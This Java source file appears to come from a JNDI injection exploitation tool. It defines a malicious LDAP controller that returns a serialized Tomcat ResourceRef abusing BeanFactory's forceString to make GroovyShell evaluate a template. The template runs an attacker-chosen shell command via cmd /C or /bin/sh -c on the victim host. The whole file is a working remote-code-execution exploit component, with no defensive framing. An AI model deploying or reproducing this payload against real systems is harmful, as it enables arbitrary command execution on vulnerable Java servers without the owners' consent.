package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.utils.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;

/*
 * Requires:
 *   - Tomcat and Groovy in classpath
 *
 * @author https://twitter.com/orange_8361 and https://github.com/welk1n
 *
 * Groovy 语法参考：
 *      - https://xz.aliyun.com/t/8231#toc-7
 *      - https://my.oschina.net/jjyuangu/blog/1815945
 *      - https://stackoverflow.com/questions/4689240/detecting-the-platform-window-or-linux-by-groovy-grails
 */

@LdapMapping(uri = { "/groovybypass" })
public class GroovyBypassController implements LdapController {
    private PayloadType type;
    private String[] params;
    private String template = " if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
            "       ['cmd','/C', '${cmd}'].execute();\n" +
            "   } else {\n" +
            "       ['/bin/sh','-c', '${cmd}'].execute();\n" +
            "   }";

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Sending LDAP ResourceRef result for " + base + " with groovy.lang.GroovyShell payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", template.replace("${cmd}", params[0]).replace("${cmd}", params[0])));

        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try{
            int firstIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            //因为我对 grovvy 的语法完全不懂，所以目前只支持执行命令这一种形式的 PayloadType
            String payloadType = base.substring(firstIndex + 1, secondIndex);
            if(payloadType.equalsIgnoreCase("command")){
                type = PayloadType.valueOf("command");
                System.out.println("[+] Paylaod: " + type);
            }else{
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + payloadType);
            }

            String cmd = Util.getCmdFromBase(base);
            System.out.println("[+] Command: " + cmd);
            params = new String[]{cmd};
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}